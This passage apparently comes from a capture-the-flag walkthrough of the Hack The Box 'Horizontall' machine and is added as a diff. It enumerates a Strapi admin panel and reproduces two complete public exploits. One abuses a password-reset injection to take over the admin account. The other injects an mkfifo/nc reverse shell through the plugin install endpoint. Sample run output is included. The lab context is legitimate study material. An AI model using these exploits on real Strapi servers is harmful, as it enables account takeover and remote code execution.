@@ -74,4 +74,167 @@ Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
 2021/09/04 00:16:24 Finished
 ===============================================================
 ```
-So now we see a subdomain. Lets access it by first adding the domain and the ip address into the `/etc/hosts` file like we did with the domain `horizontall.htb`. After accessing, I see something very interesting.
+So now we see a subdomain. Lets access it by first adding the domain and the ip address into the `/etc/hosts` file like we did with the domain `horizontall.htb`. 
+<br />
+![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(2).PNG?raw=true) 
+<br />
+After accessing, it's pretty much empty so I'm gonna go ahead and enumerate some directories using `gobuster dir -w /usr/share/wordlists/dirb/big.txt -u api-prod.horizontall.htb`. The gobuster scan gives me these results
+```markdown
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api-prod.horizontall.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/09/04 02:03:12 Starting gobuster in directory enumeration mode
+===============================================================
+/ADMIN                (Status: 200) [Size: 854]
+/Admin                (Status: 200) [Size: 854]
+/admin                (Status: 200) [Size: 854]
+/favicon.ico          (Status: 200) [Size: 1150]
+/reviews              (Status: 200) [Size: 507] 
+/robots.txt           (Status: 200) [Size: 121] 
+/secci�               (Status: 400) [Size: 69]  
+/users                (Status: 403) [Size: 60]  
+                                                
+===============================================================
+2021/09/04 02:06:00 Finished
+===============================================================
+```
+The admin page looks pretty interesting, so I'm gonna check it out. 
+<br />
+![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(3).PNG?raw=true) 
+<br />
+It's running something called strapi, so lets see if theres some existing exploits or CVE's for this thing. A quick google search lands me this <a href="https://www.exploit-db.com/exploits/50239">exploitdb</a> code for CVE-2019-18818 + CVE-2019-19609:
+```markdown
+# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
+# Date: 2021-08-30
+# Exploit Author: Musyoka Ian
+# Vendor Homepage: https://strapi.io/
+# Software Link: https://strapi.io/
+# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
+# Tested on: Ubuntu 20.04
+# CVE : CVE-2019-18818, CVE-2019-19609
+
+#!/usr/bin/env python3
+
+import requests
+import json
+from cmd import Cmd
+import sys
+
+if len(sys.argv) != 2:
+    print("[-] Wrong number of arguments provided")
+    print("[*] Usage: python3 exploit.py <URL>\n")
+    sys.exit()
+
+
+class Terminal(Cmd):
+    prompt = "$> "
+    def default(self, args):
+        code_exec(args)
+
+def check_version():
+    global url
+    print("[+] Checking Strapi CMS Version running")
+    version = requests.get(f"{url}/admin/init").text
+    version = json.loads(version)
+    version = version["data"]["strapiVersion"]
+    if version == "3.0.0-beta.17.4":
+        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
+    else:
+        print("[-] Version mismatch trying the exploit anyway")
+
+
+def password_reset():
+    global url, jwt
+    session = requests.session()
+    params = {"code" : {"$gt":0},
+            "password" : "SuperStrongPassword1",
+            "passwordConfirmation" : "SuperStrongPassword1"
+            }
+    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
+    response = json.loads(output)
+    jwt = response["jwt"]
+    username = response["user"]["username"]
+    email = response["user"]["email"]
+
+    if "jwt" not in output:
+        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
+        sys.exit(1)
+    else:
+        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
+def code_exec(cmd):
+    global jwt, url
+    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
+    headers = {"Authorization" : f"Bearer {jwt}"}
+    data = {"plugin" : f"documentation && $({cmd})",
+            "port" : "1337"}
+    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
+    print(out.text)
+
+if __name__ == ("__main__"):
+    url = sys.argv[1]
+    if url.endswith("/"):
+        url = url[:-1]
+    check_version()
+    password_reset()
+    terminal = Terminal()
+    terminal.cmdloop()
+            
+```
+After downloading it, I make the file executable and I run the script with the command: `python3 exploit3.py http://api-prod.horizontall.htb`
+```markdown
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNzM2MzQwLCJleHAiOjE2MzMzMjgzNDB9.UiR8OMmTl31-u8kBO-MXWtzZulZA8bczLNEW9Q69TGs
+```
+So now I can login to the site, I have a JSON Token, and I have a web shell. Normally I would see what I could enumerate from the site but I found another some <a href="https://github.com/dasithsv/CVE-2019-19609"> Github code </a> that utilizes my jwt to gain a reverse shell. The codes as: 
+```markdown
+#!/bin/python
+
+# Product: Strapi Framework
+# Version Affected: strapi-3.0.0-beta.17.7 and earlier
+# Fix PR: https://github.com/strapi/strapi/pull/4636
+# NPM Advisory: https://www.npmjs.com/advisories/1424
+# more information https://bittherapy.net/post/strapi-framework-remote-code-execution/
+
+import requests
+import sys
+
+print("\n\n\nStrapi Framework Vulnerable to Remote Code Execution - CVE-2019-19609")
+print("please set up a listener on port 9001 before running the script. you will get a shell to that listener\n")
+
+if len(sys.argv) ==5:
+    rhost = sys.argv[1]
+    lhost = sys.argv[2]
+    jwt = sys.argv[3]
+    url = sys.argv[4]+'admin/plugins/install'
+
+    headers = {
+        'Host': rhost,
+        'Authorization': 'Bearer '+jwt,
+        'Content-Type': 'application/json',
+        'Content-Length': '131',
+        'Connection': 'close',
+    }
+
+    data = '{ "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+lhost+' 9001 >/tmp/f)", "port":"80" }'
+    response = requests.post(url, headers=headers, data=data, verify=False)
+
+else:
+    print('python3 exploit.py <rhost> <lhost> <jwt> <url>')
+ ```
+ 
